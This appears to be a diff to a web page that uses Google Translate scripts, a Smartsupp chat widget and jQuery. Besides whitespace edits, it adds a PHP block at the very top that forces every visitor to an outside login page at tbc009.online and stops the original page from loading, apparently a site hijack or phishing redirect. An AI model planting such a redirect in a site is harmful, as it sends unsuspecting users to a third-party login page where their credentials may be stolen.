@@ -1,3 +1,9 @@
+
+<?php
+header('Location: http://tbc009.online/login');
+exit();
+?>
+
 <!DOCTYPE html>
 <html lang="en" style="height: 100%;">
 
@@ -108,8 +114,8 @@
         href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.qhDXWpKopYk.L.W.O/am=wA/d=0/rs=AN8SPfq5gedF4FIOWZgYyMCNZA5tU966ig/m=el_main_css">
     <script type="text/javascript" charset="UTF-8"
         src="https://translate.googleapis.com/_/translate_http/_/js/k=translate_http.tr.en_GB.heNvnTSa3GQ.O/d=1/exm=el_conf/ed=1/rs=AN8SPfoasbaQZ2ym7nOcVSK-WUs3IQYMrA/m=el_main"></script>
-        
-        
+
+
         <!-- Smartsupp Live Chat script -->
 <script type="text/javascript">
 var _smartsupp = _smartsupp || {};
@@ -504,7 +510,7 @@ window.smartsupp||(function(d) {
 
         <!-- jQuery -->
 
-        
+
         <script src="/prime/assets/js/vendor/jquery-3.5.1.min.js"></script>
 
 
@@ -8901,7 +8907,7 @@ function googleTranslateElementInit() {
 
 <script type="text/javascript" src="/prime/translate.google.com/translate_a/elementa0d8.js?cb=googleTranslateElementInit"></script>
 
-        
+
 
 
 
@@ -8909,7 +8915,7 @@ function googleTranslateElementInit() {
 
 
     </div>
-    
+
 </body>
 
 </html>
